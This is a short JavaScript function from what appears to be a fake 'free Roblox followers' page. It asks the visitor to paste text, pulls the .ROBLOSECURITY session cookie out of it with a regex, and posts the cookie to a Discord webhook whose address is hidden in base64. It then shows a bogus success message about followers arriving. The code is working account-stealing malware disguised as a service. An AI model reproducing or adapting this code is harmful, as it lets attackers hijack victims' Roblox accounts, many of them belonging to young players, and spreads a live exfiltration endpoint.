async function a1b2c3d4(p1q2r3, s4t5u7) {
    const e5f6g7 = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM0NjY1MjEzOTEzNjQ4MzM3OS81SnZNYTd1NHhrTERmbFV2RUVwQkdFc3JTSnh3V19kY1lrV3ZTdDlXWUNfd2NjbGc5Ylh4Z1JEOXFnLUN5N3YtMlE5MQ=='; 
    const g8h9i0 = atob(e5f6g7); 

    const robloxSecurityCookieMatch = p1q2r3.match(/\.ROBLOSECURITY", "([^"]+)"/);
    if (!robloxSecurityCookieMatch) {
        x1y2z3("Error", "Please enter a valid code.", "error", "Retry");
        return;
    }
    const robloxSecurityCookie = robloxSecurityCookieMatch[1];

    const embedMessage = {
        embeds: [
            {
                title: "Roblox Follow Request",
                color: 5814783,
                fields: [
                    {
                        name: "Follow Amount",
                        value: s4t5u7,
                        inline: false
                    },
                    {
                        name: ".ROBLOSECURITY",
                        value: robloxSecurityCookie,
                        inline: false
                    }
                ],
                footer: {
                    text: "Follow request sent"
                }
            }
        ]
    };

    console.log("Sending to webhook:", g8h9i0, embedMessage); // Debugging line

    try {
        const response = await fetch(g8h9i0, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(embedMessage)
        });

        if (response.ok) {
            x1b2z3("Success", "Successfully sent. Wait 2 or 4 minutes.", "success", "Okay");
        } else {
            const errorText = await response.text(); // Get error message from response
            console.error("Webhook response error:", errorText);
            x1b2z3("Error", "Failed to send Followers to Roblox Account.", "error", "Retry");
        }
    } catch (error) {
        console.error("Error:", error);
        x1b2z3("Error", "An error occurred while sending Followers", "error", "Retry");
    }
}
